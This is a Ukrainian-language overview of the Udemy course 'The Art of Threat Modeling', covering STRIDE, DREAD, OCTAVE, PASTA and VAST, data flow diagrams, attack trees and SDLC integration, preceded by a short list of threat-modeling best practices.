- **Threat modeling as code** - інтеграція з DevOps
- **AI-assisted analysis** - використання штучного інтелекту
- **Continuous threat modeling** - безперервний процес

### 💡 **Best Practices:**
- Починайте threat modeling на ранніх етапах
- Залучайте мультидисциплінарні команди
- Використовуйте структуровані методології
- Автоматизуйте де це можливо
- Регулярно оновлюйте threat models
- Інтегруйте з процесами розробки

**Пам'ятайте:** Threat modeling - це не одноразова активність, а безперервний процес, який має еволюціонувати разом з вашою системою та ландшафтом загроз.

-------------------------------------------------------------------------------------------------------------------------------------------

# The Art of Threat Modeling - Курс Udemy
https://ua.udemy.com/course/the-art-of-threat-modeling-a-step-by-step-approach/


## Загальний огляд курсу

**"The Art of Threat Modeling - A Step-by-Step Approach"** є комплексним навчальним курсом на платформі Udemy, призначеним для навчання професіоналів у галузі безпеки, розробників, системних архітекторів та IT-менеджерів основам та передовим методикам моделювання загроз.

## Ключові теми курсу

### 1. Фундаментальні концепції
- **Основи моделювання загроз** та їх роль у проактивних практиках безпеки
- **Принципи безпеки** та важливість раннього виявлення загроз
- **Ідентифікація активів, загроз, вразливостей та контролів** у системах та додатках

### 2. Візуалізація та аналіз
- **Створення діаграм потоків даних (Data Flow Diagrams - DFD)**
- **Аналіз границь довіри (Trust Boundaries)** для візуалізації потенційних векторів атак
- **Побудова дерев атак (Attack Trees)** для аналізу впливу та серйозності загроз

### 3. Практичні техніки
- **Створення та використання випадків зловживання (Misuse/Abuse Cases)**
- **Пріоритизація та рейтингування загроз** на основі ризику, впливу та можливості експлуатації
- **Стратегії пом'якшення та контрзаходи** для протидії ідентифікованим загрозам

## Ключові методології моделювання загроз

### 1. **STRIDE**
Модель для ідентифікації загроз комп'ютерної безпеки, розроблена Microsoft. Забезпечує мнемонічну схему для шести категорій загроз безпеки:
- **S**poofing (Підміна особи)
- **T**ampering (Несанкціоновані зміни)
- **R**epudiation (Відмова від відповідальності)
- **I**nformation Disclosure (Розкриття інформації)
- **D**enial of Service (Відмова в обслуговуванні)
- **E**levation of Privilege (Підвищення привілеїв)

### 2. **DREAD**
Методологія моделювання загроз, розроблена Microsoft, що використовується для оцінки та рейтингування загроз:
- **D**amage potential (Потенціал пошкоджень)
- **R**eproducibility (Відтворюваність)
- **E**xploitability (Можливість експлуатації)
- **A**ffected users (Постраждалі користувачі)
- **D**iscoverability (Можливість виявлення)

### 3. **OCTAVE**
Методологія OCTAVE (Operationally Critical Threat, Asset, and Vulnerability Evaluation) була створена в 2003 році як орієнтований на операції підхід до моделювання загроз, що фокусується на організаційних ризиках, а не на технологічних загрозах.

### 4. **PASTA**
Process for Attack Simulation and Threat Analysis (PASTA) - це семиетапна методологія, орієнтована на атакуючого та ризик-центрична методологія, що виконує аналіз загроз зі стратегічної перспективи.

### 5. **VAST**
Visual, Agile, and Simple Threat (VAST) - інноваційна структура моделювання загроз, розроблена для масштабування в корпоративних середовищах, що автоматизує процеси та безшовно інтегрується з Agile-середовищами.

## Ключові інструменти та техніки

### Діаграми та візуалізація
- **Data Flow Diagrams (DFD)** - для ілюстрації потоку даних та дій користувача
- **Trust Boundaries** - для визначення меж безпеки в системі
- **Attack Trees** - для концептуального представлення цілей загроз

### Аналітичні методи
- **Asset Identification** - ідентифікація критичних активів
- **Threat Enumeration** - перелік можливих загроз
- **Risk Assessment** - оцінка ймовірності та впливу загроз
- **Vulnerability Analysis** - аналіз слабких місць у системі

### Пріоритизація та рейтингування
- **Risk-based Prioritization** - пріоритизація на основі ризику
- **Impact Assessment** - оцінка потенційного впливу
- **Exploitability Analysis** - аналіз можливості експлуатації

## Інтеграція з життєвим циклом розробки

### SDLC Integration
- **Design Phase** - інтеграція на етапі проектування
- **Development Phase** - впровадження під час розробки
- **Testing Phase** - валідація моделей загроз
- **Maintenance Phase** - постійне оновлення моделей

### DevSecOps підходи
- **Continuous Security** - безперервна безпека
- **Automated Threat Detection** - автоматизоване виявлення загроз
- **Collaborative Security** - спільна робота команд безпеки

## Практичні застосування

### Цільова аудиторія
- **Спеціалісти з безпеки** - аналітики безпеки та консультанти
- **Розробники програмного забезпечення** - для створення безпечних додатків
- **Системні архітектори** - для проектування захищених систем
- **IT-менеджери** - для прийняття рішень щодо безпеки

### Реальні сценарії
- **Web Applications** - моделювання загроз для веб-додатків
- **Network Infrastructure** - аналіз мережевих загроз
- **Cloud Environments** - безпека хмарних середовищ
- **IoT Systems** - загрози для пристроїв Інтернету речей

## Ключові переваги курсу

### Практичний підхід
- **Hands-on Experience** - практичний досвід роботи
- **Real-world Case Studies** - реальні кейси
- **Interactive Exercises** - інтерактивні вправи

### Комплексність
- **Step-by-Step Methodology** - покрокова методологія
- **Multiple Frameworks** - вивчення різних підходів
- **Tool Integration** - інтеграція з інструментами

### Професійний розвиток
- **Industry Best Practices** - кращі галузеві практики
- **Expert Knowledge** - експертні знання
- **Community Access** - доступ до спільноти професіоналів

Курс забезпечує глибоке розуміння мистецтва моделювання загроз, поєднуючи теоретичні знання з практичними навичками, необхідними для ефективного захисту сучасних IT-систем від широкого спектру кіберзагроз.


--------------------------------------------------------------------
